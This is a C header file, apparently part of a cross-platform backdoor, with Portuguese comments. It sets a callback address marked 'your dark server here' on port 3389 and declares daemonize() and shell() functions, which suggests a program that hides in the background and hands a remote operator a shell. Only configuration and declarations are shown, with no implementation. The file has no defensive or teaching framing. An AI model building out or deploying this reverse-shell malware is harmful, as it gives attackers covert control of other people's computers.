#ifndef _MAIN_H
#define _MAIN_H

/* Basic libraries */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>

/* Sockets */

#if defined(_WIN32) || defined(_WIN64)
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib,"ws2_32.lib") // Para o linker do MSVC
#else // Assumindo sistemas baseados em Unix (Linux)
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <sys/types.h>
    #include <fcntl.h>
    #include <X11/Xlib.h> // Específico do Linux, pode ser removido se não for usado
#endif

#define remote_addr "0.0.0.0" /* your dark server here */
#define remote_port 3389

// Inclui as declarações das outras partes do programa
#include "execfuncs.h"

// Declarações de funções com implementações específicas por plataforma
void daemonize();
void shell();

// Variável global para armazenar o caminho do executável (argv[0])
extern const char* g_executable_path;

#endif // _MAIN_H
